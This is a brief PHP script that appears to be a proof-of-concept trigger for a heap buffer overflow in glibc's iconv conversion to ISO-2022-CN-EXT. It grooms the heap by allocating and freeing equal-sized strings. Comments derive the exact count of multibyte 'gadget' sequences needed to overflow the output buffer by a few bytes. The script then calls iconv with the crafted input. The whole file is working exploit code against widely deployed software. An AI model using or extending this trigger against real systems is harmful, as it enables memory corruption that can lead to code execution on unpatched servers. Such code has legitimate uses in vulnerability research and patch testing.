<?php

$SIZE = 0x100 - 0x18 - 1;

$array = [];

for($i=0;$i<100;$i++) {
    $array[] = str_shuffle(str_repeat('A', $SIZE - 1));
}


unset($array[53]);
unset($array[52]);
unset($array[51]);
unset($array[50]);

# To trigger the bug, we want to overflow from byte N-2 of the output buffer
# We will use two "gadgets" that increase the size of the buffer after conversion to
# pad it
# - These 4 bytes become 10: 劄\n
# - These 7 bytes become 12: 劄劄\n
# With N = |input|, M = |output|, we have:
# N = 4x + 7y + z + 3
# M = N + 32 + 7
# M = 10x + 12y + z + 9
# Therefore, 33 = 6x + 5y
# Solved with (x = 3, y = 3)
$input = 
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ."AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
    "AAA劄劄\n劄劄\n劄劄\n劄\n劄\n劄\n劄";
$output = iconv("UTF-8", "ISO-2022-CN-EXT", $input);

for($i=0;$i<4;$i++) {
    $array[] = str_shuffle(str_repeat('A', $SIZE - 1));
}